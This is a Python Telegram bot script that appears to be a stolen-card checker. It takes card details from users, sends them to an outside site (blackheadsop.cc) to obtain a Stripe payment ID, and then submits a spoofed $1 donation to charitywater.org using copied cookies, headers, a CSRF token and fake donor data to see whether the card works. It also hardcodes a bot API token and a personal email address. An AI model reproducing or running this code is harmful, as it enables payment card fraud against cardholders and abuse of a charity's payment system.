#Owner @Happy_kuma
import telebot
import requests
import time

API_TOKEN = '7245962091:AAFfV2x_Wij2p7xwK3-6TMc1IFmbR7dDmgA'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "𝕎𝕖𝕝𝕔𝕠𝕞𝕖! ℙ𝕝𝕖𝕒𝕤𝕖 𝕦𝕤𝕖 𝕥𝕙𝕖 /𝕤𝕕 𝕔𝕠𝕞𝕞𝕒𝕟𝕕 𝕗𝕠𝕝𝕝𝕠𝕨𝕖𝕕 𝕓𝕪 𝕪𝕠𝕦𝕣 𝕔𝕒𝕣𝕕 𝕕𝕖𝕥𝕒𝕚𝕝𝕤 𝔸𝕟𝕕 𝕠𝕨𝕟𝕖𝕣 @𝕙𝕒𝕡𝕡𝕪_𝕜𝕦𝕞𝕒 .")

@bot.message_handler(commands=['sd'])
def handle_card(message):
    card = message.text[4:].strip()

    response = requests.get(f'https://blackheadsop.cc/api/index.php?card={card}')
    
    if response.status_code == 200:
        json_response = response.json()
        
        if 'payment_id' in json_response:
            payment_id = json_response['payment_id']
            
            start_time = time.time()
            
            cookies = {
    'countrypreference': 'US',
    'optimizelyEndUserId': 'oeu1723482777381r0.20469508965873873',
    '_gcl_au': '1.1.1262640113.1723482780',
    '_fbp': 'fb.1.1723482780701.23425539073409647',
    '_ga': 'GA1.1.1094979413.1723482781',
    'FPAU': '1.1.1262640113.1723482780',
    '__stripe_mid': 'c3147e7d-81dd-4f65-b73f-e207cb843ca657c9e6',
    'IR_gbd': 'charitywater.org',
    '_tt_enable_cookie': '1',
    '_ttp': 'H9EunlezsKnajTxdTkuFcwr8vj9',
    'builderSessionId': '3594fbca5148436e86ec99a6664e224a',
    'tatari-cookie-test': '49892909',
    't-ip': '1',
    'tatari-session-cookie': '150aed26-c546-4908-9197-10e3ae7fe40e',
    'IR_16318': '1723905098863%7C0%7C1723905098863%7C%7C',
    'analytics_ids': 'Q2FP87dG03BcRPuoLLCqG5tVnfZuDFdT%2BkdAvIcwNbgpm%2F30tXywENM5yIzELVPXtbxDc%2FIXzOIRrzaub1Z0E3WEG275u8p7l8vCuAHf84wi4mjLRedbVuhJMtm4X8pbuWru6Vkmu4J4P9S%2FpzbliLBz3yY4XumChOY7OE5rfwwH--M6mUSZFe58oJtV2S--BiTjlETDCgyuYUQdPOLEPw%3D%3D',
    '__stripe_sid': '0c68cef7-820d-499a-8cbd-89938ae87d88c70c94',
    '_ga_5H0VND0XMD': 'GS1.1.1723905090.4.1.1723905115.0.0.420945714',
    '_uetsid': '4631a2f05c9d11efb5271358648732b8',
    '_uetvid': '2068673058ce11ef8ac699e8e0d94f2b',
    '_ga_SKG6MDYX1T': 'GS1.1.1723905090.4.1.1723905246.0.0.198050298',
}

            headers = {
    'authority': 'www.charitywater.org',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.charitywater.org',
    'referer': 'https://www.charitywater.org/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-csrf-token': 'h9C_eJP5Ur58dDqFQkJ2q9x-BAYv9VGGpU0wITVaABkBSjBlKZHheTpaWufQS3JV54GbSASOQ5zCBDrLp2a9eA',
    'x-requested-with': 'XMLHttpRequest',
}

            data = {
    'country': 'us',
    'payment_intent[email]': 'baignkumar593@gmail.com',
    'payment_intent[amount]': '1',
    'payment_intent[currency]': 'usd',
    'payment_intent[payment_method]': payment_id,
    'disable_existing_subscription_check': 'false',
    'donation_form[amount]': '1',
    'donation_form[comment]': '',
    'donation_form[display_name]': '',
    'donation_form[email]': 'baignkumar593@gmail.com',
    'donation_form[name]': 'Sandeep ',
    'donation_form[payment_gateway_token]': '',
    'donation_form[payment_monthly_subscription]': 'false',
    'donation_form[surname]': 'Khankhda ',
    'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
    'donation_form[setup_intent_id]': '',
    'donation_form[subscription_period]': '',
    'donation_form[metadata][address][address_line_1]': 'Street 2',
    'donation_form[metadata][address][address_line_2]': '',
    'donation_form[metadata][address][city]': 'New York ',
    'donation_form[metadata][address][country]': 'US',
    'donation_form[metadata][address][zip]': '10082',
    'donation_form[metadata][automatically_subscribe_to_mailing_lists]': 'true',
    'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/',
    'donation_form[metadata][phone_number]': '',
    'donation_form[metadata][plaid_account_id]': '',
    'donation_form[metadata][plaid_public_token]': '',
    'donation_form[metadata][url_params][touch_type]': '1',
    'donation_form[metadata][session_url_params][touch_type]': '1',
    'donation_form[metadata][with_saved_payment]': 'false',
}

            stripe_response = requests.post('https://www.charitywater.org/donate/stripe', cookies=cookies, headers=headers, data=data)
            elapsed_time = time.time() - start_time

            final_message = (
                f"𝗖𝗮𝗿𝗱: {card}\n"
                f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Donation 1$\n"
                f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {stripe_response.text}\n"
                f"Payment Id : {payment_id}\n"
                f"𝗧𝗶𝗺𝗲: {elapsed_time:.2f} seconds"
            )
            
            bot.reply_to(message, final_message)
        else:
            bot.reply_to(message, "Error: No payment_id found in the response.")
    else:
        bot.reply_to(message, "Error: Failed to connect to the API.")

bot.polling()
